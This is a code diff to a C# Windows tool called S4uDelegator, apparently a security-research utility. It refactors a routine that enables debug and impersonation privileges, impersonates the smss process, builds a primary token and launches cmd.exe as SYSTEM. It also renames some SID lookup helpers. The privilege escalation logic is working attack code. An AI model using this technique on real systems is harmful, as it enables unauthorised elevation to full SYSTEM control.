@@ -1,7 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using System.Security.Principal;
 using System.Text.RegularExpressions;
 using S4uDelegator.Interop;
 
@@ -36,22 +35,34 @@ namespace S4uDelegator.Library
 
             Console.WriteLine("[>] Trying to get SYSTEM.");
 
-            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
-            var privs = new string[] {
-                Win32Consts.SE_DEBUG_NAME,
-                Win32Consts.SE_IMPERSONATE_NAME
-            };
+            if (!Utilities.EnableTokenPrivileges(
+                new List<string> { Win32Consts.SE_DEBUG_NAME, Win32Consts.SE_IMPERSONATE_NAME },
+                out Dictionary<string, bool> adjustedPrivs))
+            {
+                foreach (var priv in adjustedPrivs)
+                {
+                    if (!priv.Value)
+                        Console.WriteLine("[-] Failed to enable {0}", priv.Key);
+                }
 
-            if (!Utilities.EnableMultiplePrivileges(hCurrentToken, privs))
                 return false;
+            }
 
-            privs = new string[] {
-                Win32Consts.SE_TCB_NAME,
-                Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME
-            };
+            if (!Utilities.ImpersonateAsSmss(
+                new List<string>
+                {
+                    Win32Consts.SE_TCB_NAME,
+                    Win32Consts.SE_ASSIGNPRIMARYTOKEN_NAME}
+                ))
+            {
+                foreach (var priv in adjustedPrivs)
+                {
+                    if (!priv.Value)
+                        Console.WriteLine("[-] Failed to enable {0}", priv.Key);
+                }
 
-            if (!Utilities.ImpersonateAsSmss(privs))
                 return false;
+            }
 
             int error;
             bool status;
@@ -81,7 +92,7 @@ namespace S4uDelegator.Library
                     hImpersonationToken,
                     TokenAccessFlags.TOKEN_ALL_ACCESS,
                     IntPtr.Zero,
-                    SECURITY_IMPERSONATION_LEVEL.SecurityAnonymous,
+                    SECURITY_IMPERSONATION_LEVEL.Anonymous,
                     TOKEN_TYPE.TokenPrimary,
                     out hPrimaryToken);
 
@@ -100,9 +111,10 @@ namespace S4uDelegator.Library
             if (hPrimaryToken == IntPtr.Zero)
                 return false;
 
+            Console.WriteLine("[>] Trying to create a token assigned process.\n");
             status = Utilities.CreateTokenAssignedProcess(
                 hPrimaryToken,
-                "C:\\Windows\\System32\\cmd.exe");
+                @"C:\Windows\System32\cmd.exe");
 
             NativeMethods.CloseHandle(hPrimaryToken);
 
@@ -200,12 +212,13 @@ namespace S4uDelegator.Library
             ref string sid,
             out string upn)
         {
+            SID_NAME_USE peUse;
             string computerName = Environment.MachineName;
-            string currentDomain = Helpers.GetCurrentDomain();
+            string currentDomain = Helpers.GetCurrentDomainName();
             string fqdn = currentDomain;
             string localSid = Helpers.ConvertAccountNameToSidString(
                 ref computerName,
-                out SID_NAME_USE peUse);
+                out SID_NAME_USE _);
             string domainSid;
             string accountName;
             string accountSid;
@@ -226,7 +239,7 @@ namespace S4uDelegator.Library
             {
                 domainSid = Helpers.ConvertAccountNameToSidString(
                     ref currentDomain,
-                    out peUse);
+                    out SID_NAME_USE _);
                 patternDomainSid = string.Format("^{0}(-\\d+)$", domainSid);
             }
 
